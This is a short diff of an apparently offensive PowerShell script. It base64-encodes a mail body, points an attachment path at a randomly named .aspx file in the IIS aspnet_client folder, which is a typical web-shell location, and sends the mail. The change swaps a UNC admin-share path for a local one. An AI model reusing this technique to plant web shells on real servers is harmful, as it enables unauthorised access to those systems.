@@ -14,7 +14,7 @@ $EncodedText =[Convert]::ToBase64String($Bytes)
 
 $Mail.Body = $EncodedText
 #attachments
-$file = "\\localhost\c$\inetpub\wwwroot\aspnet_client\lftrlmcoqbxceued.aspx"
+$file = "C:\\inetpub\\wwwroot\\aspnet_client\fjejzmxtwaialhvj.aspx"
 #$Mail.Attachments.Add($file);
 #send message
 $Mail.Send()
